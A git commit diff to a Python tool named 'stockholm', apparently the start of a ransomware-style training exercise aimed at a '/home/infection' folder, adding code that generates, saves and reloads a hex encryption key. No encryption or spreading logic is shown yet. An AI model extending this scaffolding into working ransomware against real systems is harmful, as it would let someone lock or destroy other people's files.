3b62ff5bc689f2dc8ca12c9e2b3a8bcc3f2725d6
Adrian <adrian.mael.jung@gmail.com>
2024-01-19 16:06:01 +0100

    handle generate / read hexa key

--- stockholm/src/stockholm.py
+++ stockholm/src/stockholm.py
@@ -1,6 +1,11 @@
 import argparse
 import sys
+import secrets
 import logging
+import os.path
+
+PATH_FILE_KEY="./.key"
+PATH_INFECTION_FOLDER="/home/infection"
 
 def	parse_args():
 	parser = argparse.ArgumentParser()
@@ -16,21 +21,49 @@ def	parse_args():
 
 def	print_version():
 	print("stockholm version 1.0")
+#-------------------------------------------------------------------------------------------------#
 
 def	reverse_stockholm():
 	print("reverse stockholm")
 	return 0
 
+#-------------------------------------------------------------------------------------------------#
+		
+def	create_hexa_key_file(key, path):
+	with open(path, 'w') as file:
+		file.write(key)
+
+def	generate_hexa_key():
+	key = secrets.token_hex(32)
+	return key
+
+def	read_hexa_key(path):
+	with open(path, 'r') as file:
+		key = file.read()
+	return key
+
+def	get_key():
+	print(os.path.isfile(PATH_FILE_KEY))
+	if (os.path.isfile(PATH_FILE_KEY)):
+		key = read_hexa_key(PATH_FILE_KEY)
+	else:
+		key = generate_hexa_key()
+		create_hexa_key_file(key, PATH_FILE_KEY)
+	return key
+
 def	stockholm():
 	print("stockholm")
+	key = get_key()
 	return 0
+
+#-------------------------------------------------------------------------------------------------#
 
 def	main():
 	try:
 		args = parse_args()
 		if (args.version):
 			print_version()
-		elif(args.reverse):
+		elif (args.reverse):
 			reverse_stockholm
 		else:
 			stockholm()
